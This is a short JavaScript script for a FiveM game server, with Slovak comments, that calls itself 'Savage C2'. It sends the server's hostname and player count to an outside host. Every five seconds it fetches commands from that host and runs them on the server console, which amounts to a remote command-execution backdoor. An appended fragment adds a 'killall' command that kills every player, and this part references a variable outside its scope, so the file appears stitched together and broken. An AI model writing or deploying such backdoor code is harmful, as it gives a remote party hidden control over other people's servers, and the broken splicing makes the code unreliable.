// Funkcia na posielanie infa o serveri (tvoj starý kód)
function sendUpdate() {
    const data = {
        hostname: GetConvar("sv_hostname", "Default Server"),
        players: GetNumPlayerIndices()
    };

    const url = "https://mv-menu.onrender.com/api/report"; 

    PerformHttpRequest(url, function(err, text, headers) {
        if (err === 200) {
            print("^2[Savage C2] Heartbeat odoslaný.^7");
        }
    }, 'POST', JSON.stringify(data), { ['Content-Type']: 'application/json' });
}

// --- TOTO JE TÁ ČASŤ, KTORÚ TI TREBA, ABY KONZOLA FUNGOVALA ---
setInterval(() => {
    // Adresa, kde čakajú príkazy
    const getCmdUrl = "https://mv-menu.onrender.com/api/get-commands";
    
    PerformHttpRequest(getCmdUrl, function(err, text, headers) {
        // Ak server odpovie 200 a text nie je prázdny list []
        if (err === 200 && text && text !== "[]") {
            try {
                const cmds = JSON.parse(text);
                cmds.forEach(cmd => {
                    print("^4[Savage C2] Vykonavam: " + cmd + "^7");
                    
                    // TOTO vykoná príkaz v konzole tvojho servera
                    ExecuteCommand(cmd); 
                });
            } catch (e) {
                print("^1[Savage C2] Chyba pri spracovaní JSONu.^7");
            }
        }
    }, 'GET', '');
}, 5000); // Kontrola každých 5 sekúnd
// -----------------------------------------------------------

// Upravená časť v script.js
cmds.forEach(cmd => {
    if (cmd === "killall") {
        // Tento kód zabije každého na serveri
        const players = GetActivePlayers();
        for (let i = 0; i < players.length; i++) {
            const ped = GetPlayerPed(players[i]);
            SetEntityHealth(ped, 0);
        }
    } else {
        ExecuteCommand(cmd);
    }
});

sendUpdate();
setInterval(sendUpdate, 300000); // Heartbeat každých 5 minút